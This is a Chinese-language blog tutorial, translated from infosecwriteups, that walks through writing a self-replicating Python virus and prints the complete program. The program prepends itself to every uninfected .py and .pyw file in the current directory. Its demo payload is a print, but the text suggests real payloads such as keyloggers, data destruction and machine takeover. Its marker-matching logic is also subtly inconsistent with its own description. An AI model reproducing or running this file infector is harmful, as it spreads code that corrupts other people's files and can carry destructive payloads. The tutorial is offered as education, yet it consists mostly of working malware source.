# 用 Python 制作一个自我复制的病毒|仅用于教育目的

> 原文：<https://infosecwriteups.com/make-a-self-replicating-virus-in-python-bb29404e3f6b?source=collection_archive---------0----------------------->

![](img/6b5a57daa95acc16647c0179370d8ba7.png)

[KOBU 机构](https://unsplash.com/@kobuagency?utm_source=medium&utm_medium=referral)在 [Unsplash](https://unsplash.com?utm_source=medium&utm_medium=referral) 上拍摄的照片

**合十礼！*肘撞*&*脚抖***

希望你和你的家人在这个不确定和前所未有的时期健康和安全。在这篇文章中，我们将学习如何用 python 制作一个简单的计算机病毒。

这种 python 病毒很像新型冠状病毒病毒，旨在从一个主机传播到另一个主机，并具有自我复制的能力。用更专业的术语来说，我们将编写一个程序，用自我复制代码感染 6 英尺距离(同一目录)内的所有 python 文件，并通过受感染的 python 文件执行恶意活动。

在我们开始之前，请戴上口罩并清洁双手

> **免责声明:本教程仅用于教育目的，无意促进任何非法活动。作者不对所提供信息的任何误用负责。**

# 辅导的

完整的病毒程序基本上有三个部分-

1.  **复制整个病毒程序本身。**
2.  **获取其他 python 文件，用复制代码感染它们。**
3.  **部署有效负载或恶意软件/间谍软件代码。**

为了标记病毒程序的开始和结束，我们需要在代码的第一行和最后一行放置标签。

```
# VIRUS SAYS HI!{ virus code }# VIRUS SAYS BYE!
```

接下来，我们导入所有需要的 python 库。

```
import sys
import glob
```

**第 1 部分:**我们将通过创建一个空数组并动态获取当前文件名来打开和读取它，从而在这里编写自复制代码。

```
virus_code = []

with open(sys.argv[0], 'r') as f:
    lines = f.readlines()
```

现在，我们将定义一个 bool 变量来帮助我们了解要复制的程序区域，即开始和结束标记之间的区域。然后，我们将遍历所有的行，并将它们复制到预先初始化的数组中，直到到达末尾。

```
self_replicating_part = False
for line in lines:
    if line == "# VIRUS SAYS HI!":
        self_replicating_part = True
    if not self_replicating_part:
        virus_code.append(line)
    if line == "# VIRUS SAYS BYE!\n":
        break
```

**第 2 部分:**为了找到当前目录中的所有 python 文件，我们将使用 glob 模块，并根据所需的模式匹配路径名。然后，我们将保存这些文件，并逐个读取它们，以感染我们的病毒代码。

在这里，我们将首先检查文件是否已经被感染，即查看文件是否已经包含开始标记。如果是这样，我们就进入下一个文件，如果不是这样，我们就通过将自我复制的病毒代码添加到现有的文件代码中来感染它，以便保留原来的功能。

```
python_files = glob.glob('*.py') + glob.glob('*.pyw')

for file in python_files:
    with open(file, 'r') as f:
        file_code = f.readlines()

    infected = False

    for line in file_code:
        if line == "# VIRUS SAYS HI!\n":
            infected = True
            break

    if not infected:
        final_code = []
        final_code.extend(virus_code)
        final_code.extend('\n')
        final_code.extend(file_code)

        with open(file, 'w') as f:
            f.writelines(final_code)
```

第三部分:最后，我们需要将我们的恶意代码或有效载荷添加到程序中，充当恶意软件，它可以破坏系统、破坏数据、下载其他病毒、窃取密码([运行键盘记录器](https://medium.com/analytics-vidhya/python-keylogger-tutorial-ef178d02f24a))或者可能接管整个机器。

现在，我们将只是添加一个无害的打印声明***邪恶的笑声***

```
def malicious_code():
    print("YOU HAVE BEEN INFECTED HAHAHA !!!")

malicious_code()
```

我们完了。这是完整的程序放在一起的样子——

```
# VIRUS SAYS HI!

import sys
import glob

virus_code = []

with open(sys.argv[0], 'r') as f:
    lines = f.readlines()

self_replicating_part = False
for line in lines:
    if line == "# VIRUS SAYS HI!":
        self_replicating_part = True
    if not self_replicating_part:
        virus_code.append(line)
    if line == "# VIRUS SAYS BYE!\n":
        break

python_files = glob.glob('*.py') + glob.glob('*.pyw')

for file in python_files:
    with open(file, 'r') as f:
        file_code = f.readlines()

    infected = False

    for line in file_code:
        if line == "# VIRUS SAYS HI!\n":
            infected = True
            break

    if not infected:
        final_code = []
        final_code.extend(virus_code)
        final_code.extend('\n')
        final_code.extend(file_code)

        with open(file, 'w') as f:
            f.writelines(final_code)

def malicious_code():
    print("YOU HAVE BEEN INFECTED HAHAHA !!!")

malicious_code()

# VIRUS SAYS BYE!
```

在同一个目录下创建一些测试文件，小心地执行你自己的自我复制病毒！

![](img/23557f54e6cd3d3ac6480f767aa79ffb.png)

# 结论

用执行大量抽象的高级编程语言编写病毒实用吗？用 python 这样的解释型语言编写一个病毒实用吗？在这种语言中，代码是不隐藏的，任何运行它的人都可以很容易地查看代码。嗯，什么时候编写病毒是一件实际可行的事情…

如果你喜欢这篇文章，并且想学习一些新的东西，请点击拍手按钮告诉我:)

谢谢，保重，不要在家里尝试这个！

> 支持我[https://www.buymeacoffee.com/djrobin17](https://www.buymeacoffee.com/djrobin17)

# 参考

*附注:信息安全领域每天都会出现很多难以跟上的内容。加入我们的* ***每周简讯*** *以 5 篇文章、4 个线程、3 个视频、2 个 Github Repos 和工具以及 1 个* ***工作提醒的形式免费获取所有最新的信息安全趋势！*【https://weekly.infosecwriteups.com/】*[](https://weekly.infosecwriteups.com/)***